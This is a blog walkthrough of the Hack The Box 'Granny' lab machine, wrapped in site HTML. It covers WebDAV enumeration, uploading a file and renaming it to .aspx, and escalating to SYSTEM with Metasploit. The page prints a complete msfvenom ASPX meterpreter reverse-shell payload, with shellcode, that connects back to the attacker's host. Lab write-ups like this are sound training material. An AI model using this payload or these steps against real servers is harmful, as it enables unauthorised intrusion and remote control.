@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Granny - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Granmy"><a href="#Hack-The-Box-Granny" class="headerlink" title="Hack The Box - Granny"></a>Hack The Box - Granny</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Granny, while similar to Grandpa, can be exploited using several different methods. Its IP address is <code>10.10.10.15.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/granny/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/granny)
+ |
+ |-->{SFire129}#nmap -A -v 10.10.10.15
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 16:15 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ NSE: Script scanning 10.10.10.15.
+ Initiating NSE at 16:15
+ Nmap scan report for 10.10.10.15
+ Host is up (0.098s latency).
+ Not shown: 999 filtered ports
+ PORT   STATE SERVICE VERSION
+ 80/tcp open  http    Microsoft IIS httpd 6.0
+ | http-methods:
+ |   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
+ |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+ |_http-server-header: Microsoft-IIS/6.0
+ |_http-title: Under Construction
+ | http-webdav-scan:
+ |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+ |   Server Date: Sat, 23 May 2020 20:19:43 GMT
+ |   WebDAV type: Unknown
+ |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+ |_  Server Type: Microsoft-IIS/6.0
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Device type: general purpose
+ Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
+ OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
+ Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
+ No exact OS matches for host (test conditions non-ideal).
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=262 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ TRACEROUTE (using port 80/tcp)
+ HOP RTT      ADDRESS
+ 1   98.34 ms 10.10.14.1
+ 2   98.26 ms 10.10.10.15
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 16:15
+ Completed NSE at 16:15, 0.00s elapsed
+ Initiating NSE at 16:15
+ Completed NSE at 16:15, 0.00s elapsed
+ Initiating NSE at 16:15
+ Completed NSE at 16:15, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
+            Raw packets sent: 2086 (95.312KB) | Rcvd: 38 (2.352KB)<br></figure></pre>
+<p>Browse to 80 port and view the service IIS and allow DAV service and differents web methods like PUT and MOVE.
+<br>
+<p> Run <code>davtest</code> for search uploading on website.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/granny)
+ |
+ |-->{SFire129}#davtest -url http://10.10.10.15
+ ********************************************************
+  Testing DAV connection
+ OPEN            SUCCEED:                http://10.10.10.15
+ ********************************************************
+ NOTE    Random string for this session: c9Rk2_
+ ********************************************************
+  Creating directory
+ MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_c9Rk2_
+ ********************************************************
+  Sending test files
+ PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.jsp
+ PUT     shtml   FAIL
+ PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.pl
+ PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.php
+ PUT     asp     FAIL
+ PUT     aspx    FAIL
+ PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.txt
+ PUT     cgi     FAIL
+ PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.jhtml
+ PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.html
+ PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.cfm
+ ********************************************************
+  Checking for test file execution
+ EXEC    jsp     FAIL
+ EXEC    pl      FAIL
+ EXEC    php     FAIL
+ EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.txt
+ EXEC    jhtml   FAIL
+ EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.html
+ EXEC    cfm     FAIL
+ 
+ ********************************************************
+ /usr/bin/davtest Summary:
+ Created: http://10.10.10.15/DavTestDir_c9Rk2_
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.jsp
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.pl
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.php
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.txt
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.jhtml
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.html
+ PUT File: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.cfm
+ Executes: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.txt
+ Executes: http://10.10.10.15/DavTestDir_c9Rk2_/davtest_c9Rk2_.html
+ 
+ |-------(root@kali)-------|(~/HackTheBox/granny)
+ |
+ |-->{SFire129}#</figure></pre>
+<br>
+<img src="/images/hackthebox/exploit/granny/1.png" alt="">
+<br>
+<p>The web service allow to PUT files. Run the <code>Burpsuite</code> with the proxy <code>localthos:80</code> intercept the traffic and put the file.
+<img src="/images/hackthebox/exploit/granny/2.png" alt="">
+<br>
+<p>In my case, put inside the html file <code>"Prueba Diego"</code>
+<img src="/images/hackthebox/exploit/granny/3.png" alt="">
+<br>
+<p>The response is a <code>201 code</code> with <code>APS.NET</code> as lenguage developer.
+<br>
+<img src="/images/hackthebox/exploit/granny/4.png" alt="">
+<br>
+<h2 id="Uploading Web-Shell"><a href="#Uploading Web-Shell" class="Uploading Web-Shell" title="Uploading Web Shell"></a>Uploading Web Shell</h2>
+<br>
+<p>First, create the file to reverse conection <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=1337 -f aspx</code>
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/granny)
+ |
+ |-->{SFire129}#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=1337 -f aspx
+ [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+ [-] No arch selected, selecting arch: x86 from the payload
+ No encoder or badchars specified, outputting raw payload
+ Payload size: 341 bytes
+ Final size of aspx file: 2837 bytes
+ %@ Page Language="C#" AutoEventWireup="true" %>
+ %@ Import Namespace="System.IO" %>
+ script runat="server">
+     private static Int32 MEM_COMMIT=0x1000;
+     private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
+ 
+     [System.Runtime.InteropServices.DllImport("kernel32")]
+     private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
+ 
+     [System.Runtime.InteropServices.DllImport("kernel32")]
+     private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
+ 
+     protected void Page_Load(object sender, EventArgs e)
+     {
+         byte[] jT1Y8fZdYO = new byte[341] {
+ 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,
+ 0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,
+ 0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
+ 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,
+ 0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
+ 0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
+ 0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
+ 0x68,0x0a,0x0a,0x0e,0x1d,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
+ 0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,
+ 0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,
+ 0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,
+ 0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
+ 0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,
+ 0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
+ 
+         IntPtr p03aNeR0 = VirtualAlloc(IntPtr.Zero,(UIntPtr)jT1Y8fZdYO.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+         System.Runtime.InteropServices.Marshal.Copy(jT1Y8fZdYO,0,p03aNeR0,jT1Y8fZdYO.Length);
+         IntPtr bMr_ek0uJwbD = IntPtr.Zero;
+         IntPtr p7b9K7774byX = CreateThread(IntPtr.Zero,UIntPtr.Zero,p03aNeR0,IntPtr.Zero,0,ref bMr_ek0uJwbD);
+     }
+ </script>
+ |-------(root@kali)-------|(~/HackTheBox/granny)
+ |
+ |-->{SFire129}#</figure></pre>
+<br>
+<p>Upload a file with the shell with html  extension.
+<br>
+<img src="/images/hackthebox/exploit/granny/5.png" alt="">
+<br>
+<p>Response with <code>201 code</code>
+<br>
+<img src="/images/hackthebox/exploit/granny/6.png" alt="">
+<br>
+<p>Checke the file with the web browser.
+<br>
+<img src="/images/hackthebox/exploit/granny/7.png" alt="">
+<br>
+<p>Checking the source code.
+<br>
+<img src="/images/hackthebox/exploit/granny/8.png" alt="">
+<br>
+<p>Now, need to move the file with the web method <code>MOVE</code> with the extension <code>.aspx</code>, in my case, I'll rename the fiel as a <code>diego.aspx</code>.
+<br>
+<img src="/images/hackthebox/exploit/granny/9.png" alt="">
+<br>
+<h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<br>
+<p>In the web browser, get /diego.aspx and look the metasploit.
+<br>
+<img src="/images/hackthebox/exploit/granny/10.png" alt="">
+<br>
+<h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get Privileges" title="Get Privileges"></a>Get Privileges</h2>
+<p>Migrate the process.
+<pre><figure class="highlight plain">  > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ 272   4     smss.exe
+ 324   272   csrss.exe
+ 348   272   winlogon.exe
+ 396   348   services.exe
+ 408   348   lsass.exe
+ 588   396   svchost.exe
+ 664   348   logon.scr
+ 680   396   svchost.exe
+ 736   396   svchost.exe
+ 764   396   svchost.exe
+ 800   396   svchost.exe
+ 936   396   spoolsv.exe
+ 964   396   msdtc.exe
+ 1076  396   cisvc.exe
+ 1116  396   svchost.exe
+ 1176  396   inetinfo.exe
+ 1216  396   svchost.exe
+ 1260  3728  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 1328  396   VGAuthService.exe
+ 1408  396   vmtoolsd.exe
+ 1456  396   svchost.exe
+ 1600  396   svchost.exe
+ 1704  396   alg.exe
+ 1812  588   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1916  396   dllhost.exe
+ 2308  588   wmiprvse.exe
+ 3728  1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 3828  588   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 3900  1076  cidaemon.exe
+ 3944  1076  cidaemon.exe
+ 3980  1076  cidaemon.exe
+
+  > migrate 1812
+[*] Migrating from 1260 to 1812...
+[*] Migration completed successfully.
+  > bg
+[*] Backgrounding session 1...
+msf5 exploit(windows/multi/handler) > search suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+</figure></pre>
+<br>
+<p> Configure and run for enumerate the system with <code>bpost/multi/recon/local_exploit_suggester</code>.
+<br>
+
+<pre><figure class="highlight plain"> msf5 exploit(windows/multi/handlre) > use post/multi/recon/local_exploit_suggester
+ msf5 post(multi/recon/local_exploit_suggester) > show options
+ 
+ Module options (post/multi/recon/local_exploit_suggester):
+ 
+    Name             Current Setting  Required  Description
+    ----             ---------------  --------  -----------
+    SESSION                           yes       The session to run this module on
+    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+ 
+msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf5 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf5 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 31 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+msf5 post(multi/recon/local_exploit_suggester) ></figure></pre>
+<br>
+<p>The output shown severals exploits list.
+<p>Use the exploit <code>windows/local/ms14_070_tcpip_ioctl</code>.
+<br>
+<pre><figure class="highlight plain"> msf5 exploit(windows/multi/handler) > use exploit/windows/local/ms14_070_tcpip_ioctl
+ msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
+ msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
+ msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > show options
+ 
+ Module options (exploit/windows/local/ms14_070_tcpip_ioctl):
+ 
+    Name     Current Setting  Required  Description
+    ----     ---------------  --------  -----------
+    SESSION                   yes       The session to run this module on.
+ 
+ Exploit target:
+ 
+    Id  Name
+    --  ----
+    0   Windows Server 2003 SP2
+ 
+  msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
+ session => 1
+ msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.29:4444
+ [*] Storing the shellcode in memory...
+ [*] Triggering the vulnerability...
+ [*] Checking privileges after exploitation...
+ [+] Exploitation successful!
+ [*] Sending stage (176195 bytes) to 10.10.10.15
+ [*] Meterpreter session 3 opened (10.10.14.29:4444 -> 10.10.10.15:1041) at 2020-05-23 18:22:53 -0400
+ 
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+ meterpreter >.</figure></pre>
+
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture the Flag"></a>Capture The Flag</h2>
+ <p>Capture the flag user/root.
+  <pre><figure class="highlight plain"> C:\WINDOWS\system32>
+ C:\WINDOWS\system32>cd ..
+ C:\WINDOWS>cd ..
+ C:\Documents and Settings>dir
+  Volume in drive C has no label.
+  Volume Serial Number is 246C-D7FE
+ 
+  Directory of C:\Documents and Settings
+ 
+ 04/12/2017  10:19 PM    DIR          .
+ 04/12/2017  10:19 PM    DIR          ..
+ 04/12/2017  09:48 PM    DIR          Administrator
+ 04/12/2017  05:03 PM    DIR          All Users
+ 04/12/2017  10:19 PM    DIR          Lakis
+                0 File(s)              0 bytes
+                5 Dir(s)  18,085,793,792 bytes free
+ 
+ C:\Documents and Settings>cd Lakis
+ C:\Documents and Settings\Lakis>dir
+  Volume in drive C has no label.
+  Volume Serial Number is 246C-D7FE
+ 
+  Directory of C:\Documents and Settings\Lakis
+ 
+ 04/12/2017  10:19 PM    DIR          .
+ 04/12/2017  10:19 PM    DIR          ..
+ 04/12/2017  10:19 PM    DIR          Desktop
+ 04/12/2017  10:19 PM    DIR          Favorites
+ 04/12/2017  10:19 PM    DIR          My Documents
+ 04/12/2017  04:42 PM    DIR          Start Menu
+ 04/12/2017  04:44 PM                 0 Sti_Trace.log
+                1 File(s)              0 bytes
+                6 Dir(s)  18,085,793,792 bytes free
+ 
+ C:\Documents and Settings\Lakis>cd Desktop
+ C:\Documents and Settings\Lakis\Desktop>type user.txt
+ ***Here you could be find the user flag***
+ C:\Documents and Settings\Lakis\Desktop>meterpreter >
+ C:\Documents and Settings>cd administrator
+ C:\Documents and Settings\Administrator>cd desktop
+ C:\Documents and Settings\Administrator\Desktop>type root.txt
+ ***Here you could be find the root flag***
+ C:\Documents and Settings\Administrator\Desktop>exit</figure></pre>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-23</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
